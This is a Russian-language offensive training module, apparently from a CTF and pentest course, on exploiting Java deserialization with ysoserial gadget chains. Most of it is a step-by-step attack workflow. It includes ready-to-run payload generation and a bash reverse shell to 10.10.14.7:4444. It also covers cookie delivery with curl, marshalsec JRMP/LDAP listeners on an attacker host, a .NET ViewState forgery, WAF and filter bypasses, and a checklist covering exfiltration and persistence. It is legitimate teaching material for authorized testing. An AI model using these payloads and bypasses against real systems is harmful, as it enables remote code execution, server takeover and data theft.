---
id: web-java-deser-chains
title: "Java deserialization gadget chains (ysoserial)"
category: web
parent: web-deser-expert
difficulty: expert
order: 1
tags: [java, deserialization, ysoserial, gadget, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 48
summary: "Java deserialization: как работают gadget chains, выбор по classpath, генерация ysoserial и эксплуатация RCE."
---
Java-десериализация (`ObjectInputStream.readObject`) при небезопасном входе даёт RCE — если в classpath есть подходящий **gadget chain**. Отличие от «просто найти deser» — подобрать цепочку классов, которая приведёт к выполнению команды, зная библиотеки приложения. Это ядро темы `web-deserialization`; здесь — практика: как определить classpath, выбрать chain, сгенерировать и доставить payload, а также что делать, когда прямой цепочки нет.

Java-сериализация — один из самых «дорогих» классов уязвимостей: одна уязвимая точка даёт RCE уровня сервера, а находится она руками, потому что зависит от набора библиотек конкретного WAR/JAR.

## Теория: как работает gadget chain

Java-сериализация восстанавливает объекты и вызывает их методы (`readObject`, `readResolve`, `hashCode`, `toString`, `equals`, `finalize`). Gadget chain — цепочка классов, где побочный эффект одного метода вызывает следующий, пока не дойдём до sink (`Runtime.exec`, `ProcessBuilder`, JNDI lookup, запись файла). Ключевые семейства цепочек:

- **CommonsCollections1-7** (Apache Commons Collections) — самая распространённая; версии CC3/CC4 меняют доступный триггер, а JDK-версия определяет, сработает ли `AnnotationInvocationHandler`.
- **CommonsBeanutils1** — часто присутствует (beanutils).
- **Spring1/Spring2** — Spring Framework.
- **Groovy1** — Groovy.
- **JRMPClient/JRMPListener** — сетевые (без локальной chain в payload).
- **Hibernate1/2**, **Jackson**, **ROME**, **Vaadin**, **MozillaRhino1**, **Jdk7u21**, **URLDNS** (детект без RCE).

Условие работы: соответствующие библиотеки в classpath. Если chain не подходит — `ClassNotFoundException`/`InvalidClassException` при десериализации, что само по себе является детект-сигналом.

## Как определить Java-сериализацию

Признак — магические байты `AC ED 00 05`; в base64 это префикс **`rO0AB`**, в hex — `aced0005`.

```bash
echo "rO0AB..." | base64 -d | xxd | head -2      # AC ED 00 05
echo "aced0005..." | xxd -r -p | xxd | head
```

Дополнительные признаки: заголовок `Content-Type: application/x-java-serialized-object`, а также cookie/параметры с base64-blob, RMI/JMX-трафик, Spring HTTP invoker, JMS/MQ, `ViewState` (см. `web-viewstate`), файлы `.ser`, кеш (Redis/JBoss), Apache OFBiz/WebLogic/Tomcat-специфичные точки.

## Инструменты

| Инструмент | Назначение |
|-----------|------------|
| `ysoserial` | генерация payload по имени chain |
| `GadgetProbe` | «прощупывание» доступных классов |
| `marshalsec` | JNDI/LDAP/RMI-серверы |
| `SerializationDumper` | разбор blob'ов в читаемый вид |
| Burp «Java Deserialization Scanner» | детект + генерация |
| `gadgetinspector` | статический поиск chains в jar |

```bash
# RCE с base64-обёрткой команды (устойчиво к пробелам/кавычкам)
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
# детект без RCE (только DNS-запрос)
java -jar ysoserial.jar URLDNS "http://YOUR-DNS.x" | base64 -w0
# список доступных цепочек
java -jar ysoserial.jar 2>&1 | head -40
```

## Определение classpath (GadgetProbe)

Если есть хоть какой-то канал ошибок, можно «прощупать» доступные классы: отправлять сериализованные объекты-пробы и смотреть на разницу ошибок (`ClassNotFoundException` vs `InvalidClassException`). Так подбирают подходящую chain, не имея исходников.

```bash
java -jar GadgetProbe.jar --url https://app.example/deser --wordlist gadgets.txt
java -jar GadgetProbe.jar --url https://app.example/deser --resume probes.ser --dos 5
```

Альтернатива — по исходникам/зависимостям (`pom.xml`, `build.gradle`, `WEB-INF/lib`, версии в ответах) понять, какие библиотеки есть. Список jar внутри WAR:

```bash
unzip -l app.war | grep -iE 'commons-collections|commons-beanutils|spring|groovy|hibernate|jackson'
```

## Матрица выбора цепочки

| Библиотека в classpath | Рекомендуемая chain | Ограничение |
|------------------------|--------------------|-------------|
| Commons Collections 3.1-3.2.1 | CommonsCollections6 (JDK-агностик) | нужен CC |
| Commons Collections 4.0 | CommonsCollections2/4 | нужен CC4 |
| commons-beanutils | CommonsBeanutils1 | часто в Spring-стеке |
| Spring Core | Spring1/Spring2 | версия Spring |
| Groovy | Groovy1 | метод `MethodClosure` |
| Только JDK (старый) | Jdk7u21 | JDK ≤ 7u21 |
| Ничего локально | JRMPClient + marshalsec | нужен исходящий RMI |

Правило: начинайте с `CommonsCollections6` (работает на большинстве JDK 8 и требует только CC3), затем `CommonsBeanutils1` (не требует CC вообще), затем Spring/Groovy. Если ошибки намекают на отсутствие CC — переключайтесь.

## Разобранный пример 1: CommonsCollections → RCE

Шаг 1 — находим точку десериализации (base64 `rO0AB`, `x-java-serialized-object`, RMI).

```bash
echo "rO0AB..." | base64 -d | xxd | head
```

Шаг 2 — определяем библиотеки (по ответам/исходникам/версиям). Пусть есть Commons Collections 3.2 → подойдёт `CommonsCollections6`.

Шаг 3 — генерируем payload:

```bash
java -jar ysoserial.jar CommonsCollections6 "id" > p.bin
base64 -w0 p.bin
```

Шаг 4 — отправляем:

```bash
curl -s "https://app.example/" -H "Cookie: session=$(base64 -w0 p.bin)"
```

Шаг 5 — если нужен вывод, используйте OOB (reverse shell/DNS) или запись файла:

```bash
java -jar ysoserial.jar CommonsCollections6 'bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"' > p.bin
```

## Разобранный пример 2: JNDI + JRMP (без прямой chain)

Если локальной chain нет, но есть JNDI/JRMP-доступ:

```bash
# на атакующем: поднимаем JRMP-листенер, отдающий gadget
java -cp marshalsec.jar marshalsec.jndi.JRMPListener 1099 CommonsCollections6 "id"
# генерируем payload, который подключится к нашему листенеру
java -jar ysoserial.jar JRMPClient "10.10.14.7:1099" | base64 -w0
```

Вариант через LDAP: `marshalsec.jndi.LDAPRefServer http://ATTACKER:8000/#Exploit` + ysoserial `JNDI`-payload. Помните: Java 8u121+/6u131+/7u121+ ограничивают `trustURLCodebase` — нужны локальные gadget или обходы.

## Разобранный пример 3: URLDNS для детекта

Когда RCE не нужен, а нужно лишь подтвердить, что десериализация происходит:

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE.YOUR-DNS" | base64 -w0
# смотрим на DNS-запрос у себя -> десериализация есть
```

`URLDNS` не требует сторонних библиотек и работает почти везде — это самый безопасный способ подтвердить уязвимость, не рискуя уронить приложение.

## Разобранный пример 4: поиск chain по исходникам

Когда под рукой jar'ники/исходники, ищем sink и цепочку статически:

```bash
# какие библиотеки в classpath
unzip -l app.war | grep -i 'commons-collections\|beanutils\|spring'
# ищем sink в исходниках
grep -rn "readObject\|readResolve\|Runtime.getRuntime().exec" src/
# gadgetinspector находит цепочки в jar
java -jar gadgetinspector.jar app.jar
```

Затем сопоставляем найденные классы с известными chain в ysoserial (по имени и версии библиотеки).

## Разбор blob'а через SerializationDumper

Когда непонятно, что именно в payload (например, для отладки кастомной chain):

```bash
java -jar SerializationDumper.jar -r payload.bin
# вывод: дерево классов/полей, что читается первым
```

Это помогает понять, какой `readObject` вызывается и почему цепочка обрывается.

## Обходы и ограничения

- **WAF блокирует `AC ED 00 05`** — используйте gzip/base64/другой протокол доставки, меняйте первые байты через совместимые потоки; иногда достаточно передать payload в другом поле.
- **Java 8u121+** ограничивает JNDI (`trustURLCodebase=false`) — ищите локальные chains.
- **`ObjectInputFilter`** (blacklist/whitelist, JEP 290) — подбирайте разрешённую chain или обходите через нефильтруемый класс.
- **Версия JDK** влияет на доступность классов (`Jdk7u21` только на старых).
- **`ysoserial` payload с `bash -c {echo,...}|{base64,-d}|bash`** помогает, если ломается пробел/кавычка.
- **Отсутствие вывода** — sink `exec` не пишет в HTTP-ответ; используйте OOB-канал.

## Защита и её обход

Правильно: не десериализовать недоверенные данные; использовать `ObjectInputFilter` (JEP 290) с allowlist; отдавать JSON вместо Java-сериализации. Обходы: whitelist часто содержит класс с опасным `readObject` (например, из JDK) — его и используют; blacklist по имени класса обходится через подклассы/`readResolve`.

## Частые ошибки

- **Отправить chain без нужной библиотеки.** `ClassNotFoundException`.
- **Не определить версию/библиотеки.** Выбор chain вслепую бесполезен.
- **Забыть про версию JDK.** Влияет на доступность классов.
- **Игнорировать WAF.** Кодируйте/оборачивайте payload.
- **Ждать вывода в ответе.** RCE через OOB/файл.
- **Путать с XXE/JSON.** Разный формат; Java-deser — бинарь `AC ED`.
- **Ломать прод.** RCE — только с согласия.

## Что дальше / решение

1. Нашли `rO0AB`/`AC ED 00 05` → подтвердите детектом `URLDNS` (нужны только DNS).
2. Определите библиотеки (ответы/исходники/GadgetProbe) → выберите chain.
3. Chain не срабатывает → проверьте версию, попробуйте другой номер (CC1..CC7, Beanutils).
4. JNDI доступен, локальной chain нет → JRMP/LDAP + marshalsec.
5. RCE подтверждён → **устойчивый** канал + **read-back** доказательство.
6. Тупик → переходите к смежным темам (`web-viewstate`, `web-log4shell-jndi`).

## Справочная таблица

| Признак | Значение | Действие |
|---------|----------|----------|
| `rO0AB` (base64) | Java-объект | декодировать, искать точку |
| `AC ED 00 05` (hex) | то же | подтвердить детектом |
| `x-java-serialized-object` | Content-Type | точка deser |
| `ClassNotFoundException` | нет библиотеки | сменить chain |
| `InvalidClassException` | версия класса не та | подобрать версию |
| `URLDNS` сработал | deser есть | подобрать RCE-chain |
| JRMP 1099 открыт | RMI | marshalsec |
## Практический чек-лист по шагам

Полный порядок действий для Java-десериализации в реальном тесте:

1. **Обнаружение.** Ищите `rO0AB`/`AC ED 00 05` в cookie, параметрах, заголовках; смотрите Content-Type `application/x-java-serialized-object`; проверьте RMI/JMX (1099/1090), Spring HTTP invoker, JMS.
2. **Подтверждение (безопасно).** Сгенерируйте `URLDNS`-payload на уникальный домен и убедитесь, что пришёл DNS-запрос. Это доказывает deser без риска для прода.
3. **Инвентаризация classpath.** Соберите список библиотек: `WEB-INF/lib`, `pom.xml`, `build.gradle`, баннеры версий, `GadgetProbe` по каналу ошибок.
4. **Выбор chain.** Сверьтесь с матрицей: CC → `CommonsCollections6`, beanutils → `CommonsBeanutils1`, Spring → `Spring1/2`, Groovy → `Groovy1`, только JDK → `Jdk7u21`.
5. **Генерация.** `ysoserial` с base64-обёрткой команды; при необходимости `-` gzip для обхода WAF.
6. **Доставка.** Тот же формат/поле/кодировка, что в оригинале (base64, hex, raw body, cookie).
7. **Эксфильтрация.** Sink не пишет в ответ — используйте reverse shell, DNS, запись файла и чтение через LFI.
8. **Закрепление.** Stateless RCE → устойчивый канал (tunnel/reverse shell), затем read-back доказательство.

## Разобранный пример 5: CTF-кейс с ViewState

ASP.NET `ViewState` — та же идея «подписанного blob'а», но с .NET-десериализацией. Если `machineKey` утёк или предсказуем (`AutoGenerate`+утечка, дефолт в старых сборках), ViewState можно подделать и получить RCE через `ysoserial.net`:

```bash
# генерация ViewState-гаджета под известный machineKey
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c whoami" --generator=MACHINEKEY --path="/default.aspx" \
  --apppath="/" --decryptionalg="AES" --decryptionkey="..." \
  --validationalg="SHA1" --validationkey="..."
# результат — base64 ViewState, подставляется в __VIEWSTATE
```

Полная тема — в `web-viewstate`; здесь важно помнить, что Java- и .NET-десериализация различаются инструментами (`ysoserial` vs `ysoserial.net`), но методология одна: детект → инвентаризация ключей/классов → гаджет → доставка → OOB.

## Взаимодействие со смежными векторами

- **`web-log4shell-jndi`** — если JNDI-lookup доступен, `JRMPClient`/`LDAP`-payload из ysoserial — это «мост» к Log4Shell-инфраструктуре.
- **`web-viewstate`** — .NET-аналог с подписью.
- **`web-deserialization`** — теоретическая база (форматы, детект).
- **`web-xxe`** — другой способ доставить объект/запустить lookup через XML-парсер.

Практический вывод: перед выбором Java-chain всегда проверьте, нет ли у приложения JNDI-поверхности — иногда `JRMPClient` проще, чем подбор локальной цепочки под незнакомый classpath.

## Квиз

```quiz
- question: "Что такое gadget chain в Java?"
  options:
    - "Пароль"
    - "Цепочка классов, чьи методы при десериализации приводят к sink"
    - "Тип cookie"
    - "XML-тег"
  answer: 1
  explanation: "Побочные эффекты методов ведут к RCE."
- question: "Какой инструмент генерирует Java-deser payload?"
  options:
    - "sqlmap"
    - "ysoserial"
    - "nmap"
    - "ffuf"
  answer: 1
  explanation: "ysoserial по имени chain."
- question: "Что означает префикс rO0AB?"
  options:
    - "Base64 JSON"
    - "Base64 Java serialized object (AC ED 00 05)"
    - "XML"
    - "PNG"
  answer: 1
  explanation: "Сериализованный Java-объект."
- question: "Что нужно, чтобы chain сработала?"
  options:
    - "Только JDK"
    - "Соответствующие библиотеки в classpath"
    - "TLS"
    - "Cookie"
  answer: 1
  explanation: "Иначе ClassNotFound."
- question: "Чем полезна CommonsCollections?"
  options:
    - "Это БД"
    - "Популярная chain при наличии Apache Commons Collections"
    - "Это сервер"
    - "Это WAF"
  answer: 1
  explanation: "Самая распространённая цепочка."
```

## Где пригодится

- **CTF (Web):** задачи на Java-deser.
- **Bug bounty:** deser RCE — критичный отчёт.
- **Пентест:** аудит Java-приложений, RMI/JMX.
- **Работа (AppSec):** ObjectInputFilter, отказ от Java-сериализации, обновление библиотек.
